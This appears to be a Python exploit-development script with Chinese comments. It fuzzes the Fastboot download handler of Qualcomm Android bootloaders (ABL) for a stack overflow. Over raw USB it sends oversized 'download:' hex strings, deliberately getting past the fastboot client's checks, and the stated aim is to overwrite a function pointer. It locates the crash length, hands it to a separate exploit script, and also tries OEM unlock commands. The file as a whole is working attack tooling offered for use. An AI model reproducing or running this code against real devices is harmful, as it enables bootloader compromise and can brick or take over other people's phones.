#!/usr/bin/env python3
"""
download_prober.py — Fastboot Download 命令长度探测器
=====================================================
目标函数: sub_35610 (Fastboot download handler)
漏洞点:   sub_3330 内部对 hex size 字符串的长度检查不严
利用原理: 通过发送畸形的 download:<oversized_hex> 命令，
          溢出 "不安全栈" 上的响应缓冲区，覆盖 X20 函数指针

两种模式:
  1. RAW USB 模式 (--usb)  : 通过 pyusb 直接操作 Fastboot USB 端点
  2. CLI 模式 (默认)       : 通过 subprocess 调用 fastboot 命令行工具

用法:
  python download_prober.py              # CLI 模式
  python download_prober.py --usb        # RAW USB 模式
  python download_prober.py --dry-run    # 干跑（不连接设备）
"""

import subprocess
import struct
import sys
import time
import argparse
import os

# ─── 常量定义 ─────────────────────────────────────────────────────────────────
FASTBOOT_VID = 0x18D1          # Google Vendor ID (Qualcomm 设备 Fastboot 模式)
FASTBOOT_PID_LIST = [
    0xD00D,                    # 通用 Fastboot PID
    0x4EE0,                    # Qualcomm 特定 PID
    0x9025,                    # 一加/OPPO
]
USB_TIMEOUT_MS = 3000          # USB 读写超时
RESPONSE_TIMEOUT_S = 4         # 等待设备响应的超时

# Fastboot USB 端点（大多数 Qualcomm 设备）
EP_OUT = 0x01                  # Host → Device
EP_IN  = 0x81                  # Device → Host

# 探测范围
PROBE_LENGTHS = [8, 16, 32, 48, 64, 80, 96, 112, 128, 160, 192, 224, 256, 384, 512]


# ─── USB 通信层 ───────────────────────────────────────────────────────────────
class FastbootUSB:
    """直接通过 pyusb 与 Fastboot 设备通信，绕过 fastboot 客户端的格式校验"""

    def __init__(self):
        self.dev = None
        self.ep_out = None
        self.ep_in = None

    def connect(self):
        """查找并连接 Fastboot 设备"""
        try:
            import usb.core
            import usb.util
        except ImportError:
            print("[!] 需要安装 pyusb: pip install pyusb")
            print("[!] Windows 还需要安装 libusb 驱动 (可用 Zadig 工具)")
            sys.exit(1)

        for pid in FASTBOOT_PID_LIST:
            self.dev = usb.core.find(idVendor=FASTBOOT_VID, idProduct=pid)
            if self.dev:
                print(f"[+] 找到设备: VID={FASTBOOT_VID:#06x} PID={pid:#06x}")
                break

        if not self.dev:
            print("[!] 未找到 Fastboot 设备，请确认:")
            print("    1. 设备已进入 Fastboot 模式")
            print("    2. USB 驱动已正确安装")
            print("    3. VID/PID 是否匹配 (可用 lsusb/USBDeview 查看)")
            sys.exit(1)

        # 选择配置和接口
        try:
            self.dev.set_configuration()
        except Exception:
            pass  # 可能已设置

        cfg = self.dev.get_active_configuration()
        intf = cfg[(0, 0)]

        import usb.util
        self.ep_out = usb.util.find_descriptor(
            intf, custom_match=lambda e: usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_OUT
        )
        self.ep_in = usb.util.find_descriptor(
            intf, custom_match=lambda e: usb.util.endpoint_direction(e.bEndpointAddress) == usb.util.ENDPOINT_IN
        )

        if not self.ep_out or not self.ep_in:
            print("[!] 无法获取 USB 端点")
            sys.exit(1)

        print(f"[+] EP_OUT={self.ep_out.bEndpointAddress:#04x}  EP_IN={self.ep_in.bEndpointAddress:#04x}")

    def send(self, data: bytes):
        """发送原始数据到设备"""
        self.ep_out.write(data, timeout=USB_TIMEOUT_MS)

    def recv(self, size=512) -> bytes:
        """从设备接收原始响应"""
        try:
            return bytes(self.ep_in.read(size, timeout=USB_TIMEOUT_MS))
        except Exception:
            return b""

    def send_command(self, cmd: str) -> str:
        """发送 Fastboot 命令并接收响应"""
        self.send(cmd.encode('utf-8'))
        resp = self.recv()
        return resp.decode('utf-8', errors='replace') if resp else ""


# ─── 探测引擎 ────────────────────────────────────────────────────────────────
def probe_via_usb(lengths, verbose=False):
    """
    通过 RAW USB 发送畸形 download 命令进行探测
    关键：绕过 fastboot 客户端对 size 的校验，直接发送原始字节
    """
    fb = FastbootUSB()
    fb.connect()

    print("\n" + "=" * 70)
    print("  Fastboot Download Handler 长度探测 (RAW USB 模式)")
    print("=" * 70)

    results = []

    for length in lengths:
        # ── 构造畸形 download 命令 ──
        # 正常格式: "download:XXXXXXXX" (8位16进制)
        # 畸形格式: "download:" + "41" * N  (超长16进制字符串)
        hex_payload = "41" * length  # 全用 'A' 填充
        raw_cmd = f"download:{hex_payload}"

        print(f"\n[*] 长度 {length:>4d} 字符 | 命令总长 {len(raw_cmd):>4d} 字节", end="", flush=True)

        try:
            fb.send(raw_cmd.encode('utf-8'))
            time.sleep(0.3)
            resp = fb.recv(4096)

            if resp:
                resp_str = resp.decode('utf-8', errors='replace')
                status = resp_str[:4] if len(resp_str) >= 4 else resp_str

                if status == "DATA":
                    print(f"  → DATA 响应 (正常处理)")
                    # 发送 0 字节数据来正常结束这次 download
                    fb.send(b"")
                    fb.recv()
                elif status == "FAIL":
                    print(f"  → FAIL: {resp_str[4:].strip()}")
                elif status == "OKAY":
                    print(f"  → OKAY (异常!)")
                else:
                    print(f"  → 未知响应: {resp_str[:64]}")

                if verbose:
                    print(f"       RAW: {resp.hex()[:128]}")

                results.append({
                    'length': length,
                    'status': 'alive',
                    'response': resp_str[:128]
                })
            else:
                print(f"  → [空响应 - 可能已崩溃]")
                results.append({
                    'length': length,
                    'status': 'empty',
                    'response': ''
                })

        except Exception as e:
            error_str = str(e)
            if "timeout" in error_str.lower() or "pipe" in error_str.lower():
                print(f"\n\n{'!' * 70}")
                print(f"  [!!!] 设备在长度 {length} 处停止响应！疑似崩溃！")
                print(f"{'!' * 70}")
                results.append({
                    'length': length,
                    'status': 'crash',
                    'response': error_str
                })
                break
            else:
                print(f"  → 错误: {error_str}")
                results.append({
                    'length': length,
                    'status': 'error',
                    'response': error_str
                })

        time.sleep(0.5)

    return results


def probe_via_cli(lengths, verbose=False):
    """
    通过 fastboot CLI 工具进行探测
    注意：标准 fastboot 工具会对 size 做客户端校验，某些畸形输入会被拦截
    """
    print("\n" + "=" * 70)
    print("  Fastboot Download Handler 长度探测 (CLI 模式)")
    print("  注意: 标准 fastboot 工具会限制部分格式，建议使用 --usb 模式")
    print("=" * 70)

    results = []

    for length in lengths:
        hex_payload = "0x" + "00" * 4 + "A" * (length - 8) if length > 8 else "0x" + "A" * length

        print(f"\n[*] 长度 {length:>4d} | payload: {hex_payload[:40]}{'...' if len(hex_payload) > 40 else ''}",
              end="", flush=True)

        try:
            proc = subprocess.run(
                ["fastboot", "download", hex_payload],
                capture_output=True,
                text=True,
                timeout=RESPONSE_TIMEOUT_S
            )

            stderr = proc.stderr.strip()
            stdout = proc.stdout.strip()
            output = stderr or stdout

            if "FAILED" in output.upper() or "error" in output.lower():
                print(f"  → 拒绝: {output[:80]}")
                results.append({'length': length, 'status': 'rejected', 'response': output})
            else:
                print(f"  → 响应: {output[:80]}")
                results.append({'length': length, 'status': 'alive', 'response': output})

            if verbose:
                print(f"       stdout: {stdout[:100]}")
                print(f"       stderr: {stderr[:100]}")

        except subprocess.TimeoutExpired:
            print(f"\n\n{'!' * 70}")
            print(f"  [!!!] 超时！设备在长度 {length} 处停止响应！疑似崩溃！")
            print(f"{'!' * 70}")
            results.append({'length': length, 'status': 'crash', 'response': 'TIMEOUT'})
            break

        except FileNotFoundError:
            print("\n[!] 未找到 fastboot 工具，请确认已安装 Android SDK Platform Tools")
            sys.exit(1)

        except Exception as e:
            print(f"  → 异常: {e}")
            results.append({'length': length, 'status': 'error', 'response': str(e)})

        time.sleep(0.5)

    return results


def probe_raw_fastboot_oem(verbose=False):
    """
    附加探测：尝试通过 oem 命令的变体来测试 download handler
    某些 OEM 命令会间接调用 download 路径
    """
    print("\n" + "-" * 70)
    print("  附加探测：OEM 命令变体测试")
    print("-" * 70)

    oem_cmds = [
        "oem get-download-mode",
        "oem device-info",
        "oem unlock-go",
        "getvar max-download-size",
    ]

    for cmd in oem_cmds:
        parts = cmd.split()
        print(f"\n[*] 测试: fastboot {cmd}", end="", flush=True)
        try:
            proc = subprocess.run(
                ["fastboot"] + parts,
                capture_output=True,
                text=True,
                timeout=3
            )
            output = (proc.stderr or proc.stdout).strip()
            print(f"  → {output[:100]}")
        except subprocess.TimeoutExpired:
            print(f"  → [超时]")
        except Exception as e:
            print(f"  → [错误: {e}]")


# ─── 结果分析 ────────────────────────────────────────────────────────────────
def analyze_results(results):
    """分析探测结果，定位可能的溢出点"""
    print("\n\n" + "=" * 70)
    print("  探测结果摘要")
    print("=" * 70)

    crash_points = [r for r in results if r['status'] == 'crash']
    empty_points = [r for r in results if r['status'] == 'empty']

    print(f"\n  总探测次数:   {len(results)}")
    print(f"  正常响应:     {sum(1 for r in results if r['status'] == 'alive')}")
    print(f"  被拒绝:       {sum(1 for r in results if r['status'] == 'rejected')}")
    print(f"  空响应:       {len(empty_points)}")
    print(f"  疑似崩溃:     {len(crash_points)}")

    if crash_points:
        crash_len = crash_points[0]['length']
        print(f"\n  ★ 关键发现: 设备在 hex_size 长度 = {crash_len} 处崩溃!")
        print(f"  ★ 缓冲区大小估计: ~{crash_len} 字节")
        print(f"  ★ 溢出起始点约在 {crash_len - 16} ~ {crash_len} 字节")
        print(f"\n  → 下一步: 运行 download_exploit.py 进行精确利用")
        return crash_len

    if empty_points:
        first_empty = empty_points[0]['length']
        print(f"\n  ⚠ 注意: 长度 = {first_empty} 处开始出现空响应")
        print(f"  ⚠ 可能是缓冲区边界，需要进一步确认")
        return first_empty

    print("\n  [-] 在测试范围内未检测到异常")
    print("  [-] 建议扩大测试范围或使用 --usb 模式绕过客户端限制")
    return None


# ─── Dry Run 模式 ─────────────────────────────────────────────────────────────
def dry_run():
    """干跑模式：验证脚本逻辑，不连接设备"""
    print("\n" + "=" * 70)
    print("  DRY RUN 模式 — 验证脚本逻辑")
    print("=" * 70)

    print("\n[*] 命令构造测试:")
    for length in [8, 64, 128, 256]:
        hex_payload = "41" * length
        cmd = f"download:{hex_payload}"
        print(f"  长度 {length:>4d}: cmd_len={len(cmd):>4d}  前32字节={cmd[:32]}...")

    print("\n[*] ARM64 'DATA' 指令解码:")
    data_bytes = b"DATA"
    # ARM64 是小端序
    insn_val = struct.unpack("<I", data_bytes)[0]
    print(f"  'DATA' = 0x{insn_val:08X}")
    print(f"  作为 ARM64 指令: 取决于具体编码，需要反汇编确认")

    print("\n[+] Dry run 完成，所有逻辑正常")


# ─── 主入口 ───────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Fastboot Download 命令长度探测器 — 测试 sub_35610 / sub_3330 溢出",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  python download_prober.py                    # CLI 模式，标准探测
  python download_prober.py --usb              # RAW USB 模式 (推荐)
  python download_prober.py --usb -v           # RAW USB + 详细输出
  python download_prober.py --range 8 512 16   # 自定义范围 (start stop step)
  python download_prober.py --dry-run          # 干跑验证
        """
    )
    parser.add_argument("--usb", action="store_true", help="使用 RAW USB 模式 (需要 pyusb)")
    parser.add_argument("--dry-run", action="store_true", help="干跑模式，不连接设备")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--range", nargs=3, type=int, metavar=("START", "STOP", "STEP"),
                        help="自定义探测长度范围")
    parser.add_argument("--oem", action="store_true", help="附加 OEM 命令探测")
    args = parser.parse_args()

    print("╔══════════════════════════════════════════════════════════════════════╗")
    print("║     Qualcomm ABL Download Handler 溢出探测器 v1.0                   ║")
    print("║     目标: sub_35610 → sub_3330 (hex size 字符串溢出)                ║")
    print("╚══════════════════════════════════════════════════════════════════════╝")

    if args.dry_run:
        dry_run()
        return

    # 确定探测长度列表
    if args.range:
        lengths = list(range(args.range[0], args.range[1], args.range[2]))
    else:
        lengths = PROBE_LENGTHS

    # 执行探测
    if args.usb:
        results = probe_via_usb(lengths, verbose=args.verbose)
    else:
        results = probe_via_cli(lengths, verbose=args.verbose)

    # OEM 附加探测
    if args.oem:
        probe_raw_fastboot_oem(verbose=args.verbose)

    # 分析结果
    crash_point = analyze_results(results)

    if crash_point:
        print(f"\n[+] 建议使用以下参数运行 exploit:")
        print(f"    python download_exploit.py --overflow-len {crash_point}")


if __name__ == "__main__":
    main()
